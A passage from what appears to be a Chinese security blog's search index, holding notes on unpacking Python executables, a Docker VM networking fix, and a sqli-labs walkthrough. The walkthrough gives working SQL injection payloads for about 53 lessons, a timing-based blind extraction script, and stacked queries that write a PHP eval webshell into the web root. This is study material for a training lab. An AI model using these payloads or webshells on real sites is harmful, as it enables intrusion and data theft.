用二进制编辑软件去除文件头和最后的两个0字节去掉。 12345678//文件头结构struct Header &#123; int tag; // Size: 4 bytes int optimize; // Size: 4 bytes int unbuffered; // Size: 4 bytes int data_bytes; // Size: 4 byteschar zippath[VARIABLE_SIZE] // Size: variable &#125;; 把code对象转换成pyo文件(Linux) 1234import marshalmylist=marshal.load(open(&quot;0cf&quot;, &quot;r&quot;))print mylistmarshal.dump(mylist[2], open(&quot;main.pyo&quot;,&quot;w&quot;)) 修补文件头 用 WinHex 加上 8 个字节的 file header。前 4 个字节代表 Python 版本号，后 4 个字节是 timestamp，可以打开另外一个pyo文件将前 8 个字节复制过去(图中阴影部分)。（必须与library.zip中pyo的前8个字节保持一致）。 反编译pyo文件 uncompyle6反编译 3、反混淆处理3.1 pyinstxtractor提取失败现象是 pyinstxtractor提取失败 ，显示 “Error : Unsupported pyinstaller version or not a pyinstaller archive” 来到pyinstxtractor代码的第50行，原来代码逻辑是这样的，一旦读取不到MAGIC，就会报错，提示不是pyinstaller打包程序。 网上追溯，可以看到标识MAGIC为 ‘ MEI\\xxxxxx ’，2.0版本的MAGIC位于 [end - 24] 处，2.1版本的MAGIC位于 [end - 88] 处。 我们在 ‘MEI’ 后面发现了python27.dll，这个就是pylibname，看来这个是pyinstaller2.1打包的，所以我们就删除从’MEI’+88之后的所有垃圾数据。删除后的结果如下： 修复后，可以正常转换了。 3.2 无pyc头部数据异常 有时候遇到pyinstxtractor 反编译出来的文件缺少pyc头，由4字节的magic和4字节的时间戳组成，其中magic会因为python版本的不同而不同，此时查找其他成功的文件，复制一个pyc头部。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://zwjsfdbb.top/tags/%E9%80%86%E5%90%91/"}]},{"title":"虚拟机中的docker 网络问题解决","slug":"Web渗透/docker 网络访问","date":"2023-12-18T16:00:00.000Z","updated":"2024-03-12T10:13:14.503Z","comments":true,"path":"2023/12/19/Web渗透/docker 网络访问/","link":"","permalink":"http://zwjsfdbb.top/2023/12/19/Web%E6%B8%97%E9%80%8F/docker%20%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE/","excerpt":"Web 环境 部署在 虚拟机上的docker容器中，虚拟机挂起后访问失败。这是因为 虚拟机在挂起或者重启后，采用桥接网卡的网络设置会发生变更。此时需要永久保留虚拟机的网络配置 使能进行数据包转发 1234567# 修改配置文件vim /usr/lib/sysctl.d/00-system.conf# 尾部添加设置net.ipv4.ip_forward=1 重启网络服务 1systemctl restart network","text":"Web 环境 部署在 虚拟机上的docker容器中，虚拟机挂起后访问失败。这是因为 虚拟机在挂起或者重启后，采用桥接网卡的网络设置会发生变更。此时需要永久保留虚拟机的网络配置 使能进行数据包转发 1234567# 修改配置文件vim /usr/lib/sysctl.d/00-system.conf# 尾部添加设置net.ipv4.ip_forward=1 重启网络服务 1systemctl restart network","categories":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/categories/web%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://zwjsfdbb.top/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"sqli-labs 学习","slug":"Web渗透/sqli-labs 实战","date":"2023-12-15T16:00:00.000Z","updated":"2024-03-12T10:14:59.523Z","comments":true,"path":"2023/12/16/Web渗透/sqli-labs 实战/","link":"","permalink":"http://zwjsfdbb.top/2023/12/16/Web%E6%B8%97%E9%80%8F/sqli-labs%20%E5%AE%9E%E6%88%98/","excerpt":"1、lesson 1 1234567891011121314# 测试步骤1 测试是否是数值型，显示一致，说明不是数值型http://192.168.101.10:12345/Less-1/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-1/?id=1 and 1= 2 正常显示 # 测试步骤2 加单引号报错，继续测试，两种回显不一致，说明存在注入点，是字符型http://192.168.101.10:12345/Less-1/?id=1&#x27; 报错http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 1 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 2 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 3 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 4 --+ 报错 # 联合查询，输出2,3 http://192.168.101.10:12345/Less-1/?id= -1&#x27; union select 1,2,3 --+ 2、lesson 2 12345678910111213# 测试步骤1 测试是否是数值型，显示不一致http://192.168.101.10:12345/Less-2/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-2/?id=1 and 1= 2 另一种# 测试步骤2 加单引号报错，进一步确认存在注入点http://192.168.101.10:12345/Less-2?id=1&#x27;# order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-2/?id=1 order by 4 --+ 报错 # 联合查询，输出2,3 http://192.168.101.10:12345/Less-2/?id= -1 union select 1,2,3 --+ 3、lesson 3 1234567891011121314151617# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-3/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-3/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号报错，继续测试，两种回显报错，说明语句有问题,但是是字符型http://192.168.101.10:12345/Less-3/?id=1&#x27; 报错http://192.168.101.10:12345/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错# 测试步骤3 ，加) 实际语句应该是 select * from id=(&#x27;$id&#x27;) 类似这种http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-3/?id= 1&#x27;) order by 4 --+ 报错# 测试步骤4 联合注入http://192.168.101.10:12345/Less-3/?id= -1&#x27;) union select 1,2,3--+ 4、lesson 4 12345678910111213141516171819# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-4/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-4/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号,正常显示，加双引号http://192.168.101.10:12345/Less-4/?id=1&#x27; 正常显示http://192.168.101.10:12345/Less-4/?id=1&quot; 报错http://192.168.101.10:12345/Less-4/?id=1&quot; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错http://192.168.101.10:12345/Less-4/?id=1&quot; and &quot;1&quot;=&quot;1&quot; --+ 报错 # 测试步骤3 ，加) 实际语句应该是 select * from id=(&quot;$id&quot;) 类似这种http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;1&quot; --+ --+ 正常显示http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;2&quot; --+ --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-4/?id=1&quot;) order by 4 --+# 测试步骤4 联合注入http://192.168.101.10:12345/Less-4/?id=-1&quot;) union select 1,2,3--+ 5、lesson5 1234567891011121314151617# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-5/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-5/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号,正常显示，加双引号http://192.168.101.10:12345/Less-5/?id=1&#x27; 报错http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-5/?id=1&#x27; order by 4 --+# 测试步骤4 联合注入http://192.168.101.10:12345/Less-5/?id=-1&#x27; union select 1,2,3 --+ 不显示2，3# 测试步骤5 报错注入http://192.168.101.10:12345/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 显示数据库名字","text":"1、lesson 1 1234567891011121314# 测试步骤1 测试是否是数值型，显示一致，说明不是数值型http://192.168.101.10:12345/Less-1/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-1/?id=1 and 1= 2 正常显示 # 测试步骤2 加单引号报错，继续测试，两种回显不一致，说明存在注入点，是字符型http://192.168.101.10:12345/Less-1/?id=1&#x27; 报错http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-1/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 1 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 2 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 3 --+ 回显正常http://192.168.101.10:12345/Less-1/?id=1&#x27; order by 4 --+ 报错 # 联合查询，输出2,3 http://192.168.101.10:12345/Less-1/?id= -1&#x27; union select 1,2,3 --+ 2、lesson 2 12345678910111213# 测试步骤1 测试是否是数值型，显示不一致http://192.168.101.10:12345/Less-2/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-2/?id=1 and 1= 2 另一种# 测试步骤2 加单引号报错，进一步确认存在注入点http://192.168.101.10:12345/Less-2?id=1&#x27;# order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-2/?id=1 order by 4 --+ 报错 # 联合查询，输出2,3 http://192.168.101.10:12345/Less-2/?id= -1 union select 1,2,3 --+ 3、lesson 3 1234567891011121314151617# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-3/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-3/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号报错，继续测试，两种回显报错，说明语句有问题,但是是字符型http://192.168.101.10:12345/Less-3/?id=1&#x27; 报错http://192.168.101.10:12345/Less-3/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错# 测试步骤3 ，加) 实际语句应该是 select * from id=(&#x27;$id&#x27;) 类似这种http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-3/?id=1&#x27;) and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-3/?id= 1&#x27;) order by 4 --+ 报错# 测试步骤4 联合注入http://192.168.101.10:12345/Less-3/?id= -1&#x27;) union select 1,2,3--+ 4、lesson 4 12345678910111213141516171819# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-4/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-4/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号,正常显示，加双引号http://192.168.101.10:12345/Less-4/?id=1&#x27; 正常显示http://192.168.101.10:12345/Less-4/?id=1&quot; 报错http://192.168.101.10:12345/Less-4/?id=1&quot; and &#x27;1&#x27;=&#x27;1&#x27; --+ 报错http://192.168.101.10:12345/Less-4/?id=1&quot; and &quot;1&quot;=&quot;1&quot; --+ 报错 # 测试步骤3 ，加) 实际语句应该是 select * from id=(&quot;$id&quot;) 类似这种http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;1&quot; --+ --+ 正常显示http://192.168.101.10:12345/Less-4/?id=1&quot;) and &quot;1&quot;=&quot;2&quot; --+ --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-4/?id=1&quot;) order by 4 --+# 测试步骤4 联合注入http://192.168.101.10:12345/Less-4/?id=-1&quot;) union select 1,2,3--+ 5、lesson5 1234567891011121314151617# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-5/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-5/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号,正常显示，加双引号http://192.168.101.10:12345/Less-5/?id=1&#x27; 报错http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; --+ 正常显示http://192.168.101.10:12345/Less-5/?id=1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-5/?id=1&#x27; order by 4 --+# 测试步骤4 联合注入http://192.168.101.10:12345/Less-5/?id=-1&#x27; union select 1,2,3 --+ 不显示2，3# 测试步骤5 报错注入http://192.168.101.10:12345/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 显示数据库名字 6、lesson 6 123456789101112131415161718# 测试步骤1 测试是否是数值型，显示一致http://192.168.101.10:12345/Less-6/?id=1 and 1= 1 正常显示http://192.168.101.10:12345/Less-6/?id=1 and 1= 2 正常显示# 测试步骤2 加单引号,正常显示，加双引号http://192.168.101.10:12345/Less-6/?id=1&#x27; 正常显示http://192.168.101.10:12345/Less-6/?id=1&quot; 报错http://192.168.101.10:12345/Less-6/?id=1&quot; and &quot;1&quot;=&quot;1&quot; --+ 正常显示http://192.168.101.10:12345/Less-6/?id=1&quot; and &quot;1&quot;=&quot;2&quot; --+ 另一种# 测试步骤3 order 确定列数 确认列数为三列http://192.168.101.10:12345/Less-6/?id=1&quot; order by 4 --+# 测试步骤4 联合注入http://192.168.101.10:12345/Less-6/?id=-1&quot; union select 1,2,3 --+ 不显示2，3# 测试步骤5 报错注入http://192.168.101.10:12345/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 显示数据库名字 7、lesson 7 1234567891011121314151617181920212223242526# select 语句 select * from users where id=((&quot;$id&quot;)) limit 0,1 无回显 只能盲注 ，写文件# 二分法测试数据库的长度# http://192.168.101.10:12345/Less-7/?id=1&#x27;) AND (SELECT 4670 FROM (SELECT(SLEEP(IF(length(database())=8,0,5))))AWIq) AND (&#x27;joMt&#x27;=&#x27;joMt# 代码跑出来数据库名字 securitydatabase = &#x27;&#x27;for i in range(1,8+1): for letter, index in enumerate(range(ord(&#x27;a&#x27;), ord(&#x27;z&#x27;) + 1)): start = time.time() # header = &#123;&quot;Cookie&quot;:&quot;PHPSESSID=7c2076c8b46b66a023cf3b2d2df89341&quot;&#125; strxx = chr(index) # url = f&quot;http://192.168.101.10/learn/read.php?id=1 and if (substr(database(),&#123;i&#125;,1)=&#x27;&#123;strxx&#125;&#x27;,sleep(3),1)&quot; url = f&quot;http://192.168.101.10:12345/Less-7/?id=1&#x27;) AND (SELECT 4670 FROM (SELECT(SLEEP(3-IF(substr(database(),&#123;i&#125;,1)=&#x27;&#123;strxx&#125;&#x27;,0,3))))AWIq) AND (&#x27;joMt&#x27;=&#x27;joMt&quot; resp = requests.get(url=url) end = time.time() if int(end-start)&gt;=3: database = database + strxxprint(database)# outfile http://192.168.101.10:12345/Less-7/?id=1&quot;)) union select 1,2,3 into outfile &quot;/var/www/html/Less-7/muma.php&quot; --+ 8、lesson 8 123# 布尔盲注http://192.168.101.10:12345/Less-8/?id=1&#x27; and length(database())=8 --+ 显示一种http://192.168.101.10:12345/Less-8/?id=1&#x27; and length(database())&gt;8 --+ 显示另一种 9、lesson 9 123456# 单引号 时间型盲注http://192.168.101.10:12345/Less-9/?id=1&#x27; and IF(length(database())=8,sleep(3),1) --+# 同样可以代码跑出来，同上url = f&quot;http://192.168.101.10:12345/Less-9/?id=1&#x27; and IF(substr(database(),&#123;i&#125;,1)=&#x27;&#123;strxx&#125;&#x27;,sleep(3),1) --+&quot; 10、lesson 10 12# 双引号 时间型盲注http://192.168.101.10:12345/Less-10/?id=1&quot; and IF(length(database())=8,sleep(3),1) --+ 11、lesson 11 12# 构造报错注入uname=admin&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=admin123 12、lesson 12 12# 构造报错注入uname=admin&quot;) and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=123456 13 、lesson 13 12 # 构造报错注入passwd=admin123&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;uname=1234 14、 lesson14 1passwd=adminxxx&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) # &amp;uname=123 15、lesson 15 1234# 首先需要知道登录成功的样子passwd=123456&amp;uname=Dumb&#x27; or 1=1 --+# 随后开始测试注入passwd=123456&amp;uname=xxx&#x27; or length(database())&gt;5 --+ 16、lesson 16 1234# 首先需要知道登录成功的样子passwd=admin123 &amp;uname=admin&quot;) or 1=1 --+ # 随后开始测试注入passwd=admin123 &amp;uname=admin&quot;) or length(database())&gt;5 --+ 17、lesson 17 12# 更新类的报错注入passwd=admin123&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27; &amp;uname=admin 18、lesson 18 12345# 已知密码才行# user-agent 注入User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1),&#x27;&#x27;,&#x27;&#x27;)#&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27; 19、lesson 19 123# refer 注入http://192.168.101.10:12345/Less-19/&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1),&#x27;&#x27;,&#x27;&#x27;)#&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27; 20、lesson 20 1234# cookie 注入uname=Dum1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+uname=Dumb&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1)--+ 21、lesson21 12345# cookie 经过了base64编码uname=RHVtYicpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpICM=对应 Dumb&#x27;) and updatexml(1,concat(0x7e,database(),0x7e),1) # 22、lesson 22 123uname = RHVtYiIgb3IgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSBvciAiDumb&quot; or updatexml(1,concat(0x7e,database(),0x7e),1) or &quot; 23 、lesson 23 1234567# 不能用注释的情况# 数值型select * from user where id=1 and 1=1 limit 0,1 payload = 1 and 1=1# 字符型select * from user where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; limit 0,1 payload = 1&#x27; and &#x27;1&#x27;=&#x27;1# 所以该题的payload 可以是 -1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27;1&#x27;=&#x27;1http://192.168.101.10:12345/Less-23?id=-1&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27;1&#x27;=&#x27;1 24 、 lesson24 二次注入 1234567# 先注册 username admin&#x27;#password 123456# 更改密码username admin&#x27;#password 654321# 实际结果如下，反而改了admin 用户的密码 and 和or 绕过 123# and ==&gt; &amp;&amp; %26%26 or ==&gt; || %7C%7Chttp://192.168.101.10:12345/Less-25?id=1&#x27; || updatexml(1,concat(0x7e,database(),0x7e),1) --+ 25a and和or 绕过 1http://192.168.101.10:12345/Less-25a/?id=-1 || length(database())=8 26 空格 注释 绕过 1http://192.168.101.10:12345/Less-26/?id=1&#x27;%20%26%26%20(updatexml(1%2Cconcat(0x7e%2Cdatabase()%2C0x7e)%2C1))%20%26%26&#x27;1&#x27;=&#x27;1 26a 空格 注释绕过 ，字符串带引号和括号 1http://192.168.101.10:12345/Less-26a/?id=1&#x27;)%20%26%26%20(length(database())=8)%20%26%26(&#x27;1&#x27;)=(&#x27;1 27 union select 绕过 1http://192.168.101.10:12345/Less-27/?id=1&#x27;%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20&#x27;1&#x27;=&#x27;1 27 a union select 双引号 绕过 1http://192.168.101.10:12345/Less-27a/?id=1&quot;%20%26%26%20(length(database())=8)%20%26%26&quot;1&quot;=&quot;1 28、 union select 单引号+ 括号 1http://192.168.101.10:12345/Less-28/?id=1&#x27;)%20%26%26%20(length(database())=8)%20%26%26(&#x27;1&#x27;)=(&#x27;1 盲注可以先用1&#x3D;1 1&#x3D;2 测试，如果结果不一样，盲注肯定可以 28 a 和28 可以用一个payload 1http://192.168.101.10:12345/Less-28a/?id=1&#x27;)%20%26%26%20(length(database())=8)%20%26%26(&#x27;1&#x27;)=(&#x27;1 29 带 WAF 单引号 1http://192.168.101.10:12345/Less-29/?id=1&#x27; and length(database())=8 --+ 30 带WAF 双引号 1http://192.168.101.10:12345/Less-30/?id=1&quot; and length(database())=8 --+ 31、带）的双引号 WAF 1http://192.168.101.10:12345/Less-31/?id=1&quot;) and length(database())=8 --+ 32 单引号转义 宽字节注入 1http://192.168.101.10:12345/Less-32/?id=1%df&#x27; and length(database())=8 --+ 33 单引号转义 1http://192.168.101.10:12345/Less-33/?id=1%df&#x27; and length(database())=8 --+ 34 、单引号 转义 post 宽字节注入 burp 下才能成功，直接用浏览器会加一些编码，所以会失败 1uname=Dumb%df&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=Dumb 35、 1http://192.168.101.10:12345/Less-35/?id=-1 or updatexml(1,concat(0x7e,database(),0x7e),1) 36 、宽字节注入 1http://192.168.101.10:12345/Less-36/?id=1%df&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 37 、post宽字节注入 同样的需要借助于burp，直接在chrome 放payload 会报错，URI malformed 1uname=Dumb%df&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) --+ &amp;passwd=Dumb&amp;submit=Submit 38、 1http://192.168.101.10:12345/Less-38/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 39、 1http://192.168.101.10:12345/Less-39/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 40、 1http://192.168.101.10:12345/Less-40/?id=1&#x27; and length(database())=8 and &#x27;1&#x27;=&#x27;1 41 1http://192.168.101.10:12345/Less-41/?id=1 and length(database())=8 42、POST 堆叠注入 12345# post请求要注意 提交的地址是哪个，另外注意什么是堆叠注入，可以连续执行多个语句http://192.168.101.10:12345/Less-42/login.phplogin_user=Dumb&amp;login_password=xxxx&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma1.php&quot;;#&amp;mysubmit=Login 43、 POST堆叠注入 多了个一个（） 123http://192.168.101.10:12345/Less-43/login.phplogin_user=Dumb&amp;login_password=xxxx&#x27;);select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma2.php&quot;;#&amp;mysubmit=Login 44、 1234http://192.168.101.10:12345/Less-44/login.phplogin_user=Dumb&amp;login_password=xxxx&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma44.php&quot;;#&amp;mysubmit=Login 45、 1login_user=Dumb&amp;login_password=xxxx&#x27;);select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma45.php&quot;;#&amp;mysubmit=Login 46 、 1http://192.168.101.10:12345/Less-46?sort=1 AND updatexml(1,concat(0x7e,database(),0x7e),1) 47、 1http://192.168.101.10:12345/Less-47?sort=1&#x27; AND updatexml(1,concat(0x7e,database(),0x7e),1) --+ 48、 1http://192.168.101.10:12345/Less-48?sort=(if(length(database())=8,ID,USERNAME)) 49、 12http://192.168.101.10:12345/Less-49?sort=1&#x27; and if(length(database())=9,sleep(5),1) and &#x27;1&#x27;=&#x27;1 50、 1http://192.168.101.10:12345/Less-50?sort=1;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma501.php&quot;;# 51、 1http://192.168.101.10:12345/Less-51?sort=1&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma51.php&quot;;# 52、 1http://192.168.101.10:12345/Less-52?sort=1;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma52.php&quot;;# 53、 1http://192.168.101.10:12345/Less-53?sort=1&#x27;;select &quot;&lt;?php @eval($_GET[&#x27;a&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/test/muma53.php&quot;;# 总结 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960http://192.168.101.10:12345/Less-7/?id=1&#x27;) and if(length(database())=8,sleep(3),1) and (&#x27;1&#x27;)=(&#x27;11、http://192.168.101.10:12345/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+2、http://192.168.101.10:12345/Less-2/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+3、http://192.168.101.10:12345/Less-3/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and&#x27;1&#x27;=&#x27;1 4、http://192.168.101.10:12345/Less-4/?id=1&quot;) and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 5、http://192.168.101.10:12345/Less-5/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+6、http://192.168.101.10:12345/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) --+7、http://192.168.101.10:12345/Less-7/?id=1&#x27;) and if(length(database())=8,sleep(3),1) and (&#x27;1&#x27;)=(&#x27;18、http://192.168.101.10:12345/Less-8/?id=1&#x27; and if(length(database())=8,sleep(3),1) and &#x27;1&#x27;=&#x27;19、http://192.168.101.10:12345/Less-9/?id=1&#x27; and if(length(database())=8,sleep(3),1) and &#x27;1&#x27;=&#x27;110、http://192.168.101.10:12345/Less-10/?id=1&quot; and if(length(database())=8,sleep(3),1) --+11、uname=admin&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) --+ &amp;passwd=admin12、uname=admin&quot; or updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot; = &quot;1 &amp;passwd=admin13、uname=admin&#x27; or updatexml(1,concat(0x7e,database(),0x7e),1) or &#x27;1&#x27;=&#x27;1 &amp;passwd=admin14、uname=admin&quot; or updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1 &amp;passwd=admin15、uname=admin&#x27; and if(length(database())=8,sleep(3),1) --+ &amp;passwd=adminuname=admin&#x27; and if(length(database())=8,sleep(3),1) --+ &amp;passwd=admin16、uname=admin&quot;) and if(length(database())=8,sleep(3),1) --+ &amp;passwd=admin17、uname=admin&amp;passwd=admin&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) --+18、user-agent: &#x27;,updatexml(1,concat(0x7e,database(),0x7e),1),&#x27;1&#x27;) #19、Refer: &#x27;,updatexml(1,concat(0x7e,database(),0x7e),1),&#x27;1&#x27;) #20、Cookie: uname=12345&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+21、Cookie: uname=MTIzNDUnIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCcxJz0nMQ==12345&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and&#x27;1&#x27;=&#x27;122、Cookie: uname=MTIzNDUiIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCIxIj0iMQ==12345&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and&quot;1&quot;=&quot;123、http://192.168.101.10:12345/Less-23/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;124、# 先注册 username admin&#x27;#password 123456# 更改密码username admin&#x27;#password 654321# 实际结果如下，反而改了admin 用户的密码25、http://192.168.101.10:12345/Less-25/?id=1&#x27; %26%26 updatexml(1,concat(0x7e,database(),0x7e),1) --+26、http://192.168.101.10:12345/Less-26/?id=1&#x27;%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20&#x27;1&#x27;=&#x27;127、http://192.168.101.10:12345/Less-27/?id=1&#x27;%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20&#x27;1&#x27;=&#x27;128、http://192.168.101.10:12345/Less-28/?id=1&#x27;%20%26%26%20%20length(database())=8%20%26%26%20&#x27;1&#x27;= &#x27;129、http://192.168.101.10:12345/Less-29/?id=1&#x27;%26%26 updatexml(1,concat(0x7e,database(),0x7e),1) --+30、http://192.168.101.10:12345/Less-30/?id=1&quot;%20%26%26%20%20length(database())=8%20%26%26%20&quot;1&quot;=&quot;131、http://192.168.101.10:12345/Less-31/?id=1&quot;%20%26%26%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%26%26%20&quot;1&quot;=&quot;132、http://192.168.101.10:12345/Less-32/?id=1%df&#x27; and length(database())=8 --+ (burp才行)33、同上34、uname=Dumb%df&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=Dumb burp35、http://192.168.101.10:12345/Less-35/?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+ 36、http://192.168.101.10:12345/Less-36/?id=1%df&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+ 37、uname=Dumb%df&#x27;and updatexml(1,concat(0x7e,database(),0x7e),1) --+ &amp;passwd=Dumb&amp;submit=Submit38、http://192.168.101.10:12345/Less-38/?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) 